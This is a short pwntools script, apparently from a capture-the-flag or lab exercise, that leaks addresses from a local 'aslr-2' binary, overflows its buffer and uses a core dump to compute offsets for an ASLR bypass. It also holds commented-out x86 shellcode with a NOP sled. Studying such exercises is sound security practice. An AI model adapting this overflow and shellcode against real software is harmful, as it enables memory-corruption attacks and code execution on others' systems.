#! /usr/bin/python

from pwn import *
import os
#context.terminal = ['tmux', 'splitw', '-h']

#env = {'SHELLCODE' : '\x90' * 50 + '\xb83\x01\x01\x01-\x01\x01\x01\x01\xcd\x80\x89\xc3\x89\xc1\xb8H\x01\x01\x01-\x01\x01\x01\x01\xcd\x801\xc9QjA\x89\xe31\xd2\xb8\x0c\x01\x01\x01-\x01\x01\x01\x01\xcd\x80'}

#[ebp+c] arg to system
#[ebp+8]
#[ret]
#[ebp]
#[ebp-4]
#
#...
#
#[ebp-88]

p = process('aslr-2')
#gdb.attach(p, 'b*main')
p.recvuntil("leak some?: ")
hex_line = p.recvuntil("\nPlease")[:-8].replace(" (nil)", "")
addresses = [int(x, 16) for x in hex_line.split(" ")]
print("Address List: " + str(addresses))

p.sendline("A" * 1000)
p.interactive()

p.close()

c = Core('core')
buffer_address = c.stack.find("AAAAAAAA")
print("---> Buffer: " + hex(buffer_address))

addresses_diff = [abs(x-buffer_address) for x in addresses]
print("Address List: " + str(addresses_diff))

